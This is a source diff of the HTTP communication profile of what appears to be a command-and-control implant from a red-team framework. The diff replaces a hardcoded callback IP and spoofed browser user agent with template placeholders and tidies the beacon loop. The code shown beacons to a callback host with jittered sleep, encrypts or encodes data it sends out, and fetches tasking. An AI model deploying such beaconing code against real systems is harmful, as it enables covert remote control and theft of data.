@@ -1,4 +1,4 @@
-﻿using Agent.Interfaces;
+using Agent.Interfaces;
 using Agent.Models;
 using System.Net;
 using Agent.Utilities;
@@ -34,18 +34,18 @@ namespace Agent.Profiles
             this.crypt = crypto;
             this.logger = logger;
             this.messageManager = messageManager;
-            int callbackPort = Int32.Parse("80");
-            string callbackHost = "http://10.30.26.108";
-            string getUri = "q";
-            string queryPath = "index";
-            string postUri = "data";
-            this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
-            this.hostHeader = "";
+            int callbackPort = Int32.Parse("callback_port");
+            string callbackHost = "callback_host";
+            string getUri = "get_uri";
+            string queryPath = "query_path_name";
+            string postUri = "post_uri";
+            this.userAgent = "%USERAGENT%";
+            this.hostHeader = "%HOSTHEADER%";
             this.getURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{getUri}?{queryPath}=";
             this.postURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{postUri}";
-            this.proxyHost = ":";
-            this.proxyPass = "";
-            this.proxyUser = "";
+            this.proxyHost = "proxy_host:proxy_port";
+            this.proxyPass = "proxy_pass";
+            this.proxyUser = "proxy_user";
 
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
@@ -114,14 +114,14 @@ namespace Agent.Profiles
                 await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
                 try
                 {
-                    string response = await messageManager.GetAgentResponseStringAsync();
-                    string responseString = await this.Send(response);
-                    //Console.WriteLine(responseString);
+                    string responseString = await this.Send(await messageManager.GetAgentResponseStringAsync());
+
                     if (String.IsNullOrEmpty(responseString))
                     {
                         this.currentAttempt++;
                         continue;
                     }
+
                     GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                     if (gtr == null)
                     {
@@ -148,26 +148,22 @@ namespace Agent.Profiles
         }
         internal async Task<string> Send(string json)
         {
-            //Console.WriteLine(json);
             try
             {
                 //This will encrypted if AES is selected or just Base64 encode if None is referenced.
                 json = this.crypt.Encrypt(json);
 
+
                 HttpResponseMessage response;
 
                 if (json.Length < 2000) //Max URL length
                 {
-                    //logger.Log($"Sending as GET");
                     response = await this._client.GetAsync(this.getURL + json.Replace('+', '-').Replace('/', '_'), cancellationTokenSource.Token);
                 }
                 else
                 {
-                    //logger.Log($"Sending as POST");
                     response = await this._client.PostAsync(this.postURL, new StringContent(json), cancellationTokenSource.Token);
                 }
-
-                //logger.Log($"Got Response with code: {response.StatusCode}");
 
                 string strRes = await response.Content.ReadAsStringAsync();
 
